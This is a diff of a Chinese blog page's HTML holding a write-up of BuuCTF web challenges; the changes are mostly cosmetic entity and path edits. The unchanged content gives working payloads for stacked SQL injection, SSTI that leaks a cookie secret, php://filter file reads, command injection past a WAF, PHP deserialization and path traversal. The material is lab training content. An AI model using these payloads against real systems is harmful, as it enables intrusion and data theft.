@@ -59,7 +59,7 @@
   </style>
   <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
   </style>
-<meta name="generator" content="Hexo 5.1.1"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
   <div class="scrollbar" id="bar">
@@ -310,29 +310,29 @@
 &lt;?php
 highlight_file(__FILE__);
 class emmm
-&#123;
+{
     public static function checkFile(&amp;$page)
-    &#123;
+    {
         $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
 
 ---a
-        if (! isset($page) || !is_string($page)) &#123;
+        if (! isset($page) || !is_string($page)) {
             echo &quot;you can&#39;t see it&quot;;
             return false;
-        &#125;
+        }
 ---b
-        if (in_array($page, $whitelist)) &#123;
+        if (in_array($page, $whitelist)) {
             return true;
-        &#125;
+        }
 ---c
         $_page = mb_substr(
             $page,
             0,
             mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
         );
-        if (in_array($_page, $whitelist)) &#123;
+        if (in_array($_page, $whitelist)) {
             return true;
-        &#125;
+        }
 ---d
         $_page = urldecode($page);
         $_page = mb_substr(
@@ -341,20 +341,20 @@ class emmm
             mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
         );
 ---e
-        if (in_array($_page, $whitelist)) &#123;
+        if (in_array($_page, $whitelist)) {
             return true;
-        &#125;
+        }
         echo &quot;you can&#39;t see it&quot;;
         return false;
-    &#125;
-&#125;
+    }
+}
 
-if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])) &#123;
+if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])) {
     include $_REQUEST[&#39;file&#39;];
     exit;
-&#125; else &#123;
+} else {
     echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-&#125;
+}
 ?&gt;
 
 hint.php
@@ -393,7 +393,7 @@ flag not here, and flag in ffffllllaaaagggg</code></pre>
 return : return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
 <p>测试中发现存在堆叠注入，查询当前数据库表结构，发现flag列名</p>
 <pre><code>payload: ?inject=&#39;;show tables;desc `1919810931114514`;desc words;</code></pre>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200801190203955.png" alt="image-20200801190203955"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.htm/image-20200801190203955.png" alt="image-20200801190203955"></p>
 <h2 id="MySQL数据表命名细节"><a href="#MySQL数据表命名细节" class="headerlink" title="MySQL数据表命名细节"></a>MySQL数据表命名细节</h2><p><strong>下列代码中A用全数字做表名，在使用时需要用反引号包裹，不然会产生错误，但如果半数字半字符或全字符则不需要</strong></p>
 <pre><code class="mysql">测试表的结构如下
 MariaDB [test]&gt; desc `1919810931114514`;  --A
@@ -431,7 +431,7 @@ MariaDB [test]&gt; desc 0d4y;
 <p><strong>解题过程</strong></p>
 <pre><code>payload: ?inject=&#39;;rename table words to w; rename table `1919810931114514` to words; alter table words change flag id varchar(255);desc words;
 return : 
-array(6) &#123;
+array(6) {
   [0]=&gt;
   string(2) &quot;id&quot;
   [1]=&gt;
@@ -444,7 +444,7 @@ array(6) &#123;
   NULL
   [5]=&gt;
   string(0) &quot;&quot;
-&#125;</code></pre>
+}</code></pre>
 <p>回显可以判断修改成功</p>
 <pre><code>payload: ?inject=1&#39; or &#39;1</code></pre>
 <p><strong>解题思路</strong></p>
@@ -560,12 +560,12 @@ Query OK, 0 rows affected (0.00 sec)</code></pre>
 +--------------------------------------------+
 1 row in set (0.00 sec)</code></pre>
 <p>payload: <code>query = *,1</code></p>
-<p><code>Array ( [0] =&gt; SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125; [1] =&gt; 1 )</code></p>
+<p><code>Array ( [0] =&gt; SUCTF{SUCTF_baby_sql_chall_120993n810h3} [1] =&gt; 1 )</code></p>
 <pre><code class="mysql">MariaDB [CTF]&gt; select *,1 || flag from flag;
 +------------------------------------------+-----------+
 | Flag                                     | 1 || flag |
 +------------------------------------------+-----------+
-| SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125; |         1 |
+| SUCTF{SUCTF_baby_sql_chall_120993n810h3} |         1 |
 +------------------------------------------+-----------+
 1 row in set (0.00 sec)</code></pre>
 <p>也可以将<code>||</code>设置为字符串连接符</p>
@@ -596,12 +596,12 @@ MariaDB [CTF]&gt; select 0||&#39;asd&#39;;
 +----------+
 1 row in set (0.00 sec)</code></pre>
 <p>payload: <code>1;set sql_mode=pipes_as_concat;select 1</code></p>
-<p><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 1SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125; )</code></p>
+<p><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 1SUCTF{SUCTF_baby_sql_chall_120993n810h3} )</code></p>
 <pre><code class="mysql">MariaDB [CTF]&gt; select 1||flag from flag;
 +-------------------------------------------+
 | 1||flag                                   |
 +-------------------------------------------+
-| 1SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125; |
+| 1SUCTF{SUCTF_baby_sql_chall_120993n810h3} |
 +-------------------------------------------+
 1 row in set (0.00 sec)</code></pre>
 <h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p><strong>解题思路</strong></p>
@@ -619,7 +619,7 @@ render
 -- /hints.txt
 md5(cookie_secret+md5(filename))</code></pre>
 <p><strong>解题思路</strong></p>
-<p>0x00 <code>render</code>模板渲染暗示存在<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/83999.html">SSTI服务端模板注入攻击</a></p>
+<p>0x00 <code>render</code>模板渲染暗示存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">SSTI服务端模板注入攻击</a></p>
 <p>0x01 <code>handler.settings</code>保存配置选项，包括<code>cookie_secret</code></p>
 <p><strong>解题方法</strong></p>
 <p>访问文件时观察url</p>
@@ -627,9 +627,9 @@ md5(cookie_secret+md5(filename))</code></pre>
 <p>存在文件读取点，访问<code>/fllllllllllllag</code></p>
 <p>页面跳转至<code>/error?msg=Error</code></p>
 <p>尝试SSTI</p>
-<pre><code>payload: /error?msg=&#123;&#123;handler.settings&#125;&#125;
+<pre><code>payload: /error?msg={{handler.settings}}
 
-界面回显: &#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;9c83fab7-1b67-404c-9aa8-69453579ac8c&#39;&#125;</code></pre>
+界面回显: {&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;9c83fab7-1b67-404c-9aa8-69453579ac8c&#39;}</code></pre>
 <p><strong>exp.py</strong></p>
 <pre><code class="python">import hashlib
 import requests
@@ -653,41 +653,41 @@ print(html.text)</code></pre>
 <p><strong>代码审计</strong></p>
 <pre><code class="php">$cat=$_GET[&#39;cat&#39;];
 echo $cat;
-if($cat==&#39;dog&#39;)&#123;
-    echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;
-&#125;</code></pre>
+if($cat==&#39;dog&#39;){
+    echo &#39;Syc{cat_cat_cat_cat}&#39;;
+}</code></pre>
 <p><strong>解题方法</strong></p>
 <pre><code>/?cat=dog</code></pre>
-<h1 id="未完成-RoarCTF-2019-Easy-Calc"><a href="#未完成-RoarCTF-2019-Easy-Calc" class="headerlink" title="(未完成)[RoarCTF 2019]Easy Calc"></a>(未完成)[RoarCTF 2019]Easy Calc</h1><pre><code class="js">$(&#39;#calc&#39;).submit(function()&#123;
-        $.ajax(&#123;
+<h1 id="未完成-RoarCTF-2019-Easy-Calc"><a href="#未完成-RoarCTF-2019-Easy-Calc" class="headerlink" title="(未完成)[RoarCTF 2019]Easy Calc"></a>(未完成)[RoarCTF 2019]Easy Calc</h1><pre><code class="js">$(&#39;#calc&#39;).submit(function(){
+        $.ajax({
             url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),
             type:&#39;GET&#39;,
-            success:function(data)&#123;
+            success:function(data){
                 $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;
-            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;
+            &lt;strong&gt;答案:&lt;/strong&gt;${data}
             &lt;/div&gt;`);
-            &#125;,
-            error:function()&#123;
+            },
+            error:function(){
                 alert(&quot;这啥?算不来!&quot;);
-            &#125;
-        &#125;)
+            }
+        })
         return false;
-    &#125;)</code></pre>
+    })</code></pre>
 <p>访问<code>calc.php</code>得到后台源码</p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
-if(!isset($_GET[&#39;num&#39;]))&#123;
+if(!isset($_GET[&#39;num&#39;])){
     show_source(__FILE__);
-&#125;else&#123;
+}else{
         $str = $_GET[&#39;num&#39;];
         $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
-        foreach ($blacklist as $blackitem) &#123;
-                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;
+        foreach ($blacklist as $blackitem) {
+                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {
                         die(&quot;what are you want to do?&quot;);
-                &#125;
-        &#125;
+                }
+        }
         eval(&#39;echo &#39;.$str.&#39;;&#39;);
-&#125;
+}
 ?&gt; </code></pre>
 <p>过滤的常用字符</p>
 <pre><code>`$^[]&#39;&quot;%20</code></pre>
@@ -700,33 +700,33 @@ foreach ($arr as $a)
     echo &quot;chr(&quot;.ord($a).&quot;).&quot;;
 //chr(47).chr(102).chr(49).chr(97).chr(103).chr(103).</code></pre>
 <p>payload中有一个很关键的地方 num 前面有一个空格，因为题中存在 WAF，对 num 的值进行了校验，直接传 payload，会返回<code>这啥?算不来</code>，于是利用php字符串解析特性绕过 WAF，此时 WAF 检测到的变量名为<code>%20num</code>，不为 num，不进行校验，但php存储的变量名为 num</p>
-<h2 id="利用PHP的字符串解析特性"><a href="#利用PHP的字符串解析特性" class="headerlink" title="利用PHP的字符串解析特性"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性</a></h2><p>PHP将查询字符串(在URL或正文中)转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>的过程中会将某些字符<strong>删除或用下划线代替</strong></p>
+<h2 id="利用PHP的字符串解析特性"><a href="#利用PHP的字符串解析特性" class="headerlink" title="利用PHP的字符串解析特性"></a><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性</a></h2><p>PHP将查询字符串(在URL或正文中)转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>的过程中会将某些字符<strong>删除或用下划线代替</strong></p>
 <p><strong>如果一个 IDS/IPS 或 WAF 中有一条规则是当 news_id 参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过</strong></p>
 <pre><code>%20news[id%00 // 这个变量名的值实际存储在 $_GET[&quot;news_id&quot;] 中</code></pre>
 <p><code>parse_str()</code>通常被自动应用于 get 、post 请求和 cookie 中，对 URL 传递入的查询字符串进行解析</p>
 <p>通过如下 fuzz 了解<code>parse_str()</code>如何处理特殊字符</p>
-<pre><code class="php">foreach([&quot;&#123;chr&#125;foo_bar&quot;, &quot;foo&#123;chr&#125;bar&quot;, &quot;foo_bar&#123;chr&#125;&quot;] as $k =&gt; $arg) &#123;
-    for($i=0;$i&lt;=255;$i++) &#123;
-        parse_str(str_replace(&quot;&#123;chr&#125;&quot;,chr($i),$arg),$o);
-        if(isset($o[&quot;foo_bar&quot;])) &#123;
+<pre><code class="php">foreach([&quot;{chr}foo_bar&quot;, &quot;foo{chr}bar&quot;, &quot;foo_bar{chr}&quot;] as $k =&gt; $arg) {
+    for($i=0;$i&lt;=255;$i++) {
+        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg),$o);
+        if(isset($o[&quot;foo_bar&quot;])) {
             echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\n&quot;;
-        &#125; // bin2hex 将字符转为16进制数
-    &#125;
+        } // bin2hex 将字符转为16进制数
+    }
     echo &quot;\n&quot;;
-&#125;</code></pre>
-<pre><code>&#123;chr&#125;foo_bar -&gt; 20 ( )
-&#123;chr&#125;foo_bar -&gt; 26 (&amp;)
-&#123;chr&#125;foo_bar -&gt; 2b (+)
+}</code></pre>
+<pre><code>{chr}foo_bar -&gt; 20 ( )
+{chr}foo_bar -&gt; 26 (&amp;)
+{chr}foo_bar -&gt; 2b (+)
 
-foo&#123;chr&#125;bar -&gt; 20 ( )
-foo&#123;chr&#125;bar -&gt; 2b (+)
-foo&#123;chr&#125;bar -&gt; 2e (.)
-foo&#123;chr&#125;bar -&gt; 5b ([)
-foo&#123;chr&#125;bar -&gt; 5f (_)
+foo{chr}bar -&gt; 20 ( )
+foo{chr}bar -&gt; 2b (+)
+foo{chr}bar -&gt; 2e (.)
+foo{chr}bar -&gt; 5b ([)
+foo{chr}bar -&gt; 5f (_)
 
-foo_bar&#123;chr&#125; -&gt; 00 ()
-foo_bar&#123;chr&#125; -&gt; 26 (&amp;)
-foo_bar&#123;chr&#125; -&gt; 3d (=)</code></pre>
+foo_bar{chr} -&gt; 00 ()
+foo_bar{chr} -&gt; 26 (&amp;)
+foo_bar{chr} -&gt; 3d (=)</code></pre>
 <p><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small"></p>
 <h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p><code>Ctrl+U</code>查看源码，发现<code>./Archive_room.php</code>；访问之后发现<code>./action.php</code></p>
 <p>访问后页面跳转到<code>./end.php</code>，进行抓包</p>
@@ -745,10 +745,10 @@ foo_bar&#123;chr&#125; -&gt; 3d (=)</code></pre>
     highlight_file(__FILE__);
     error_reporting(0);
     $file=$_GET[&#39;file&#39;];
-    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
+    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){
         echo &quot;Oh no!&quot;;
         exit();
-    &#125;
+    }
     include($file); //a
 //flag放在了flag.php里
 ?&gt;
@@ -759,7 +759,7 @@ foo_bar&#123;chr&#125; -&gt; 3d (=)</code></pre>
 <pre><code>/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
 <p>对输出的base64密文进行解密即可</p>
 <h2 id="0x01-php-filter"><a href="#0x01-php-filter" class="headerlink" title="0x01 php://filter"></a>0x01 php://filter</h2><p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727161155342.png" alt="image-20200727161155342"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.htm/image-20200727161155342.png" alt="image-20200727161155342"></p>
 <h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p><strong>解题思路</strong></p>
 <p>猜测后台代码如下</p>
 <pre><code class="php">$sql = SELECT * DROM database WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></pre>
@@ -794,22 +794,22 @@ index.php</code></pre>
 <p><code>?ip=1;cat$IFS$9index.php</code></p>
 <p><strong>代码审计</strong></p>
 <pre><code class="php">&lt;!--?php
-if(isset($_GET[&#39;ip&#39;]))&#123;
+if(isset($_GET[&#39;ip&#39;])){
   $ip = $_GET[&#39;ip&#39;];
-  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\--&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
-    echo preg_match(&quot;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&amp;gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
+  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\--&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
+    echo preg_match(&quot;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
     die(&quot;fxck your symbol!&quot;);
-  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
+  } else if(preg_match(&quot;/ /&quot;, $ip)){
     die(&quot;fxck your space!&quot;);
-  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
+  } else if(preg_match(&quot;/bash/&quot;, $ip)){
     die(&quot;fxck your bash!&quot;);
-  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
+  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
     die(&quot;fxck your flag!&quot;);
-  &#125;
+  }
   $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
   echo &quot;&lt;pre&gt;&quot;;
   print_r($a);
-&#125;</code></pre>
+}</code></pre>
 <p>过滤了除<code>$</code>外大多数符号，空格，bash，还有一句比较有意思的正则表达式</p>
 <h3 id="preg-match-“-f-l-a-g-“-ip"><a href="#preg-match-“-f-l-a-g-“-ip" class="headerlink" title="preg_match(“/.*f.*l.*a.*g.*/“, $ip)"></a>preg_match(“/.*f.*l.*a.*g.*/“, $ip)</h3><p><code>.*</code>表示匹配任意字符任意次；代码的逻辑意思就是<code>flag</code>四个字母不能同顺序出现</p>
 <p>构造payload，并查看源码</p>
@@ -821,14 +821,14 @@ if(isset($_GET[&#39;ip&#39;]))&#123;
 0000000 040 011 012 012
 0000004</code></pre>
 <p>“040”是空格，”011”是Tab，”012”是换行，最后一个”012”是因为echo默认换行</p>
-<h3 id="9"><a href="#9" class="headerlink" title="$9"></a>$9</h3><p>$1～$n表示添加到shell的各参数值；$0为当前文件名，$1是第1参数、$2是第2参数以此类推；$9此时为空值，在这里的作用为截断变量名，等同于<code>&#123;&#125;</code>(由于题目waf了大括号)，即限定变量名的范围；如果没有进行截断的话，IFS会接着和后面的字符连接为变量名，无法构成完整的内部域分隔符，当然也不一定非要为9，还可以是1~8的其他数字</p>
+<h3 id="9"><a href="#9" class="headerlink" title="$9"></a>$9</h3><p>$1～$n表示添加到shell的各参数值；$0为当前文件名，$1是第1参数、$2是第2参数以此类推；$9此时为空值，在这里的作用为截断变量名，等同于<code>{}</code>(由于题目waf了大括号)，即限定变量名的范围；如果没有进行截断的话，IFS会接着和后面的字符连接为变量名，无法构成完整的内部域分隔符，当然也不一定非要为9，还可以是1~8的其他数字</p>
 <h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><strong>题目提示</strong></p>
 <p>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</p>
 <p>文件扫描</p>
 <pre><code>python3 dirsearch.py -u url -e php
 -u url
 -e 网站语言</code></pre>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727184803212.png" alt="image-20200727184803212"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.htm/image-20200727184803212.png" alt="image-20200727184803212"></p>
 <p>下载<code>/www.zip</code></p>
 <p><strong>代码审计</strong></p>
 <pre><code class="php">----index.php
@@ -843,37 +843,37 @@ $res=unserialize(@$select);
 include &#39;flag.php&#39;;
 error_reporting(0);
 
-class Name&#123;
+class Name{
     private $username = &#39;nonono&#39;;
     private $password = &#39;yesyesyes&#39;;
 
-    public function __construct($username,$password)&#123;
+    public function __construct($username,$password){
         $this-&gt;username = $username;
         $this-&gt;password = $password;
-    &#125;
+    }
 
-    function __wakeup()&#123;
+    function __wakeup(){
         $this-&gt;username = &#39;guest&#39;;
-    &#125;
+    }
 
-    function __destruct()&#123;
-        if ($this-&gt;password != 100) &#123;
+    function __destruct(){
+        if ($this-&gt;password != 100) {
             echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
             echo &quot;You name is: &quot;;
             echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
             echo &quot;You password is: &quot;;
             echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
             die();
-        &#125;
-        if ($this-&gt;username === &#39;admin&#39;) &#123;
+        }
+        if ($this-&gt;username === &#39;admin&#39;) {
             global $flag;
             echo $flag;
-        &#125;else&#123;
+        }else{
             echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
             die();
-        &#125;
-    &#125;
-&#125;
+        }
+    }
+}
 ?&gt;</code></pre>
 <p><strong>解题思路</strong></p>
 <p>0x00 password = 100</p>
@@ -890,7 +890,7 @@ O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin
 <h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>在到对象的所有引用都被删除或者当对象被显式销毁时执行</p>
 <h2 id="0x02-对序列化结果进行url编码"><a href="#0x02-对序列化结果进行url编码" class="headerlink" title="0x02 对序列化结果进行url编码"></a>0x02 对序列化结果进行url编码</h2><p>因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上<code>%00</code>前缀字符串长度也包括所加前缀的长度</p>
 <p>但如果不进行url编码直接使用payload，可以很明显发现<code>%00</code>字符消失，自然会导致失败</p>
-<pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</code></pre>
+<pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;}</code></pre>
 <h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p><strong>解题思路</strong></p>
 <p><code>/?file=flag.php</code>猜测存在文件包含漏洞</p>
 <p><strong>解题方法</strong></p>
@@ -901,7 +901,7 @@ O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin
 <p>蚁剑连接</p>
 <h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><strong>解题方法</strong></p>
 <p>查看源码，访问<code>Secret.php</code>，会连续出现三个要求，设置http头即可</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727192826010.png" alt="image-20200727192826010"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.htm/image-20200727192826010.png" alt="image-20200727192826010"></p>
 <h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p><strong>解题方法</strong></p>
 <pre><code>target=;cd ..;cd ..;cd ..;cat flag</code></pre>
 <h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p><strong>解题思路</strong></p>
